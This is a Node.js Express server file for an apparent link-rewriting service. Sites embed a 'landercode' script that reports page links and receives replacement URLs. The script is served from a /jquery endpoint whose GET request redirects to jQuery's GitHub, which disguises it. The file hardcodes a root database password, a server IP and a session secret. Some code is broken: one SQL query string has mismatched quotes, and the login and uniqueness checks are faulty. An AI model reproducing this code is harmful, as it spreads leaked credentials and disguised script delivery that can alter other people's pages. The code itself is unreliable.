
//module dependencies
var express = require('express')
  , http = require('http')
  , mysql = require('mysql')
  , path = require('path');
var app = express();

//var compressor = require('yuicompressor');
var validator = require('validator');
var bcrypt = require('bcrypt-nodejs');
var randomstring = require("randomstring");
//var obf = require('node-obf');
var urlParser = require('url');
var fs = require("node-fs");

/* 
 * DEPLOYMENT MODE: client-mode will serve only
 * the client service calls. true to enable
 * false to disable. If false, server will be in
 * admin mode and will serve only user admin pages
 */
app.set('client-mode', false);
//Date prototype for converting Date() to MySQL DateTime format
Date.prototype.toMysqlFormat = function () {
    function pad(n) { return n < 10 ? '0' + n : n }
    return this.getFullYear() + "-" + pad(1 + this.getMonth()) + "-" + pad(this.getDate()) + " " + pad(this.getHours()) + ":" + pad(this.getMinutes()) + ":" + pad(this.getSeconds());
};

// all environments
app.set('port', process.env.PORT || 9000);
app.set('views', __dirname + '/views');
app.set('view engine', 'jade');
app.use(express.favicon());
app.use(express.logger('dev'));
app.use(express.cookieParser());
app.use(express.bodyParser());
app.use(express.session({ secret: '1234342434324' }));
app.use(express.methodOverride());
app.use(app.router);
app.use(express.static(path.join(__dirname, 'public')));

app.configure('development', function() {
    app.use(express.errorHandler());
    app.locals.pretty = true;
});

var connection = mysql.createConnection({
    host : '54.187.151.91',
    user : 'root',
    password : 'derekisfat',
    database : 'domains_dev'
});
connection.connect();

function checkAuth(req, res, next) {
    if (req.session.user_id === 'admin') {
        if(req.url.substring(0,7) == '/logout') {
            next();
        }
        else {
            res.redirect('/admindex')
        }
    }
    else if (!req.session.user_id) {
        res.redirect('login');
    } else {
        next();
    }
}

function checkAdmin(req, res, next) {
    if (req.session.user_id === 'admin') {
        next();
    } else {
        res.redirect('login');
    }
}

function setClientOrAdminMode(req, res, next) {
    if(app.get('client-mode')) {
        if(req.url.substring(0,7) == '/jquery' || req.url.substring(0,16) == '/all_domains/new') {
            next();
        }    
    } else {
        if(req.url.substring(0,7) != '/jquery' && req.url.substring(0,16) != '/all_domains/new') {
            next();
        }
    }
}

app.get('/', checkAuth, function( req, res) {
    res.render('index');
});

app.get('/admindex', checkAdmin, function( req, res) {
    connection.query('select * from all_domains ORDER BY user ASC', function(err, docs) {
        res.render('admindex', {domains: docs});
    });
});

app.get('/landercode', checkAuth, function( req, res) {
    var user = req.session.user_id; 
    fs.readFile('./client/compressed/compressed-initial.js', function(err, data) {
        if(err) throw err;
        connection.query("SELECT secret_username FROM users WHERE user = ?", [user], function(err, docs) {
            if(docs.length == 1) {
                var replacedFile = String(data).replace('replaceme', docs[0].secret_username);       

                res.send({
                    landercode:  String(replacedFile)
                });

            }
        });
    });     
});

app.get('/login', function(req, res) {
    res.render('login');
});

app.post('/login', function (req, res) {
    var post = req.body;
    var password = post.password;
    var username = post.username;
    var hash;

    connection.query('SELECT hash FROM users WHERE user = ? && approved = 1;', [username], function(err, rows) {
        if (err) {
            res.json(err);
        }
        if(rows.length == 1) {
            hash = rows[0].hash;
        } 
        else {
            var msg = {status: 'User does not exist or is not yet approved.'}
            res.render('login', {data: msg});
        }

        bcrypt.compare(password, hash, function(err, response) {
            if(response == true) {
                req.session.user_id = username;
                if(username === 'admin') {
                    res.redirect('/admindex');
                }
                else {
                    res.redirect('/');
                }
            } 
            else {
                var msg = {status: 'Bad user/password.'}
                res.render('login', {data: msg});
            }
        });
    });

});

app.get('/register', function (req, res) {
    res.render('register');
}); 

app.post('/register', function (req, res) {
    var post = req.body;
    var email = post.email;
    var password = post.password;
    var password_confirm = post.password_confirm;
 
    connection.query('SELECT id from users WHERE user = ?;', [email], function(err, docs) {
        if(docs[0]) {
            var msg = {status: 'User already exists.'}
            res.render('register', {data: msg});
        }
        else {
            if (!validator.isEmail(email)) {
                var msg = {status: 'Email address invalid.'}
                res.render('register', {data: msg});
            } 
            else if(!validator.isLength(password, 6, 20) || !validator.isAscii(password)) {
                var msg = {status: 'Password does not meet requirements.'}
                res.render('register', {data: msg});
            }
            else if(password != password_confirm) {
                var msg = {status: 'Passwords do not match.'}
                res.render('register', {data: msg});
            }
            else {
                //adding user!
                var secret = randomstring.generate(30);
                var secretNotUnique = true;
                
                //ensure unique string
                connection.query("SELECT secret_username FROM users;", function(err, docs) {
                    for(var i=0 ; i<docs.length ; i++) {
                        if(secret == docs[i]) {
                            secret = randomstring.generate(30);
                            i=0; //start over
                        }
                    }
                });
    
                bcrypt.hash(password, null, null, function(err, hash) {
                    connection.query('INSERT INTO users (user, hash, approved) VALUES(?, ?, ?);', [email, hash, 0], function(err, docs) {
                        if (err) res.json(err);
                    })
                });

                var msg = {status: 'Registration submitted and waiting for approval! An email will be sent to upon approval.'}
                res.render('register', {data: msg});
            }   
        }     
    })

});

app.get('/logout', checkAuth, function (req, res) {
    var user = req.session.user_id;
    var datetime = new Date().toMysqlFormat();
    connection.query('UPDATE users SET last_login = ? WHERE users.user = ?;', [datetime, user], function(err, docs) {
        if (err) res.json(err);
        console.log("Query Success");
        delete req.session.user_id;    
        res.redirect('/login');
    })
});

app.get('/my_domains', checkAuth, function (req, res) {
    connection.query('select * from my_domains where user = ?', [req.session.user_id],function(err, docs) {
        res.render('my_domains', {domains: docs});
    });
});

// Save the new registered domain
app.post('/my_domains', checkAuth, function (req, res) {
   var url=req.body.url;

   if (url.substring(0, 7) != "http://" && url.substring(0, 8) != "https://") {
       url = "http://" + url;
   }

   url = url.replace("http://www.", "http://");
   url = url.replace("https://www.", "https://");

   var base_url = urlParser.parse(url).hostname;

   if(validator.isURL(url)) {
       connection.query('CALL insert_my_domain(?, ?);', [base_url, req.session.user_id], function(err, docs) {
           if (err) {
               res.json(err);
           } else {
               connection.query('SELECT id FROM my_domains WHERE (user = ? AND url = ?)', [req.session.user_id, base_url], function(err, docs) {
                   if (err) {
                       res.json(err);
                   } else {
                       if(docs[0]) {
                           var id = docs[0].id;            
                           if (id) {
                               var body = {
                                   message: "success",
                                   id: id,
                                   url: base_url
                               };
                               res.status(200)
                               res.send(body);
                           }
                       }
                   }
               });
           }
       });            
   }
   else {
       var msg = {status: 'Invalid URL.'};
       res.render('my_domains', {data: msg});
   }
});

app.get('/my_domains/delete', checkAuth, function (req, res) {
    var id=req.query.id;
    
    connection.query('CALL delete_my_domain(?, ?);', [id, req.session.user_id], function(err, docs) {
        if (err) {
            res.json(err);
        } else {
            var body = {
              message: "success",
              id: id 
            };
            
            res.status(200);
            res.send(body);
        }
    });
});

app.get('/all_domains', checkAuth, function (req, res) {
    connection.query('select url, id, registered, count, rate, creation_date from all_domains where user = ?', [req.session.user_id], function(err, docs) {
        res.render('all_domains', {domains: docs});
    });
});

app.get('/all_domains/list', checkAuth, function(req, res) {
    connection.query('select * from all_domains where user = ?', [req.session.user_id], function(err, rows, fields) {
        if (err) res.json(err);
        else {
            res.send({
                    json: rows
            });
        }
    });
});

app.post('/all_domains/delete', checkAuth, function (req, res) {
    var id=req.body.id;
    
    connection.query('DELETE from all_domains where id = ?;', [id], function(err, docs) {
        if (err) res.json(err);
        else {
            res.send('');
        }
    })
});

app.get('/all_domains/new', function (req, res) {
    var url=req.query.url;

    if (url.substring(0, 7) != "http://" && url.substring(0, 8) != "https://") {
        url = "http://" + url;
    }

    url = url.replace("http://www.", "http://");
    url = url.replace("https://www.", "https://");

    var base_url = urlParser.parse(url).hostname;

    var datetime = new Date().toMysqlFormat();
    connection.query('CALL insert_domain(?, ?, ?, ?);', [url, req.session.user_id, datetime, base_url], function(err, docs) {
        if (err) res.json(err);
        else {
            var body = "success";
            res.writeHead(200, {
                'Content-Length': body.length,
                'Content-Type': 'text/plain',
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Methods': 'GET, OPTIONS',
                'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
            });
                
            res.end(body);
        }
    })
});

app.post('/all_domains/new', function (req, res) {
    var url = req.query.url;

    if (typeof url === "undefined" || url == '') {
        res.send('');
        return;
    }

    if (url.substring(0, 7) != "http://" && url.substring(0, 8) != "https://") {
        url = "http://" + url;
    }

    url = url.replace("http://www.", "http://");
    url = url.replace("https://www.", "https://");

    var base_url = urlParser.parse(url).hostname;

    var links = req.body.hrefs;
    var secretUsername = req.body.user;

    var datetime = new Date().toMysqlFormat();

    connection.query("SELECT user FROM users WHERE secret_username = ?", [secretUsername], function(err, usernameDocs) {
        if(err) throw err;
        if(usernameDocs.length == 1) {
           var user = usernameDocs[0].user;

           connection.query('CALL insert_domain(?, ?, ?, ?);', [url, user, datetime, base_url], function(err, InsertDomainDocs) {
                if(err) throw err;
                connection.query('CALL get_links(?, ?);', [url, user], function(err, getLinksDocs, fields) {
                    if(err) throw err;
                    var responseArray = getLinksDocs[0];
                    var responseArrayLen = responseArray.length;
                    var responseObject = {};

                    for (var i = 0; i < responseArrayLen; i++) {
                        if (i == 0) {
                            responseObject.rate = responseArray[i].rate;
                            responseObject.bc_rate = responseArray[i].bc_rate;
                        }

                        var key = responseArray[i].link;
                        responseObject[key] = { bc_link: responseArray[i].bc_link, user_link: responseArray[i].user_link }
                    }

                    res.writeHead(200, {
                        'Content-Type': 'application/json',
                        'Access-Control-Allow-Origin': '*',
                        'Access-Control-Allow-Methods': 'POST, OPTIONS',
                        'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
                    });

                    res.end(JSON.stringify(responseObject));

                    for (var key in links) {
                        connection.query('CALL insert_link(?, ?, ?);', [url, key, user], function(err2, rows) {
                        });
                    }
                }); 
            });
        }
    });
});

app.post('/all_domains/edit_rate', checkAuth, function (req, res) {
    var url=req.body.url;
    var rate=req.body.rate;
    connection.query('UPDATE all_domains SET rate = ? WHERE all_domains.url = ? AND all_domains.user = ?;', [rate, url, req.session.user_id], function(err, rows) {
        if (err) {
            res.json(err)
        } else {
            var body = {
                message: "success",
                rate: rate
            };
            res.status(200);
            res.send(body);
        }
    });
});

app.get('/edit_form', checkAuth, function (req, res) {
    var domain=req.query.domain;
    connection.query('CALL get_links(?, ?)', [domain, req.session.user_id], function(err, docs) {

        if(docs[0][0]) {
            res.render('edit_form', {rows: docs[0]}); 
        }  
        else {
            res.redirect('links_fail_page?domain=' + domain);
        }
        
    });
});

app.get('/links_fail_page', checkAuth, function (req, res) {
    var domain=req.query.domain;
    res.render('links_fail_page', {url: domain});
});

app.get('/links_admin', checkAdmin, function (req, res) {
    var domain=req.query.domain;
    connection.query('SELECT * FROM links WHERE domain LIKE CONCAT('%', ?, '%')', [domain], function(err, docs) {
        res.render('links_admin', {rows: docs});
    });
});

app.post('/links/edit', checkAuth, function (req, res) {
    var domain=req.body.domain;
    var link=req.body.link;
    var user_link=req.body.user_link;

    if (user_link.substring(0, 7) != "http://" && user_link.substring(0, 8) != "https://") {
        user_link = "http://" + user_link;
    }

    if (validator.isURL(user_link)) {
        connection.query('CALL insert_user_link(?, ?, ?, ?);', [domain, link, user_link, req.session.user_id], function(err, docs) {
            if (err) {
             res.json(err);
            } else {
              var body = {
                 message: "success",
                 domain: domain,
                 link: link,
                 user_link: user_link
             };
             res.status(200);
             res.send(body);
           }
        });
    }
    else {
        var msg = {status: 'Invalid URL.'};
        res.send({data: msg});
    }
});

app.get('/all_domains/new_domains', checkAuth, function (req, res) {
    var user = req.session.user_id;
    connection.query('SELECT DISTINCT all_domains.base_url FROM users, all_domains WHERE (users.last_login < all_domains.creation_date) AND (users.user = ?);', [user], function(err, docs) {
        if (err) {
            res.json(err);
        } else {
            var body = {
              message: "success",
              urls: docs 
            };
            
            res.status(200);
            res.send(body);
        }
    });
});

//Get and load client js
app.get('/jquery', function (req, res) {
    res.writeHead(301, { //You can use 301, 302 or whatever status code
      'Location': 'https://github.com/jquery/jquery',
      'Expires': (new Date()).toGMTString()
    });

    res.end();

});

app.post('/jquery', function(req, res) {
    var user=req.body.version;

    connection.query("SELECT secret_username FROM users WHERE secret_username = ?", [user], function(err, docs) {
        if(docs.length == 1) {
            fs.readFile('./client/compressed/compressed-landercode.js', function(err, data) {
                if(err) throw err;
                
                var replacedFile = String(data).replace('replaceme', user);       
               
                res.writeHead(200, {
                        'Content-Length': replacedFile.length,
                        'Content-Type': 'text/plain',
                        'Access-Control-Allow-Origin': '*',
                        'Access-Control-Allow-Methods': 'GET, OPTIONS',
                        'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
                    });
                    res.end(replacedFile);
            }); 
        }
    });

});

//app.all('*', setClientOrAdminMode);
module.exports = app;